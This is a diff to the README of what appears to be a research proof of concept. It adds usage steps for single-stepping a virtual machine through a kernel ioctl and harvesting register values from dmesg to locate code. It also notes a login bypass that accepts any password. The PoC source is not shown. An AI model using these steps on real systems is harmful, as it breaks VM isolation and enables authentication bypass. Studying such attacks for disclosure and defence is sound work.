@@ -256,5 +256,74 @@ Last login: Fri Jun 20 11:09:29 2025 from 10.0.2.2
 The login is now successful with any password because the login failure logic has been replaced with success logic.
 
 
-## Case 2: collect register features
-如果遇到不能使用内存特征来定位，我们建议使用single-step获取寄存器的值
+## Case 2: Collect Register Features
+
+When memory-based fingerprinting is not feasible, we recommend using single-step execution to collect register values. In this case, we use `register_benchmark.c` as an example, which continuously executes register operations within Cachewrap. The kernel extracts features from these operations to enable precise localization.
+
+### Step 1: Execute the Program in VM and Obtain GPA
+
+First, execute the program in the virtual machine and obtain its GPA. Please refer to the usage of `vm_get_ph.c`:
+
+```bash
+[root@localhost ~]# ps -ef | grep benchmark
+root        1184    1157 99 23:43 pts/0    00:00:07 ./benchmark
+root        1224    1197  0 23:43 ttyS0    00:00:00 grep --color=auto benchmark
+[root@localhost ~]# ./c_get 1184
+
+Program segment: /root/benchmark
+Permissions: r-xp
+Range: 0x0000000000400000 - 0x0000000000401000
+Virtual address: 0x0000000000400000 -> Physical address: 0x000000010af9e000
+
+Program segment: /root/benchmark
+Permissions: r--p
+Range: 0x0000000000600000 - 0x0000000000601000
+Virtual address: 0x0000000000600000 -> Physical address: 0x000000010a2a2000
+
+Program segment: /root/benchmark
+Permissions: rw-p
+Range: 0x0000000000601000 - 0x0000000000602000
+Virtual address: 0x0000000000601000 -> Physical address: 0x000000010c5b0000
+```
+
+### Step 2: Execute the POC
+
+```bash
+./poc single_step_page 0x000000010af9e000 10
+dmesg -c > dmesg.log
+```
+
+This triggers single-step execution through ioctl and prints register features to dmesg. Then execute:
+
+```bash
+➜  CipherShadow-Attack git:(main) ✗ python3 search_pattern.py
+Pattern found starting at position 43706
+Line 43744 [1259965.991233]: [1259965.991233] reg_vector: 0x0
+Values found:
+  Position 43706 [1259965.991233]: 0x0 (skipped)
+  Position 43707 [1259965.991307]: 0x0 (skipped)
+  Position 43708 [1259965.991381]: 0x0 (skipped)
+  Position 43709 [1259965.991455]: 0x0 (skipped)
+  Position 43710 [1259965.991528]: 0x1
+  Position 43711 [1259965.991601]: 0x80
+  Position 43712 [1259965.991675]: 0x40
+  Position 43713 [1259965.991749]: 0x10
+  Position 43714 [1259965.991823]: 0x8
+  Position 43715 [1259965.991897]: 0x4
+  Position 43716 [1259965.991982]: 0x4
+  Position 43717 [1259965.992057]: 0x0 (skipped)
+  Position 43718 [1259965.992131]: 0x0 (skipped)
+  Position 43719 [1259965.992203]: 0x8
+  Position 43720 [1259965.992276]: 0x0 (skipped)
+  Position 43721 [1259965.992349]: 0x0 (skipped)
+  Position 43722 [1259965.992421]: 0x10
+  Position 43723 [1259965.992495]: 0x40
+  Position 43724 [1259965.992568]: 0x80
+  Position 43725 [1259965.992641]: 0x0 (skipped)
+  Position 43726 [1259965.992715]: 0x0 (skipped)
+  Position 43727 [1259965.992788]: 0x0 (skipped)
+  Position 43728 [1259965.992860]: 0x0 (skipped)
+  Position 43729 [1259965.992934]: 0x1
+```
+
+This reveals the register behavior pattern that can be used for precise localization and attack targeting.
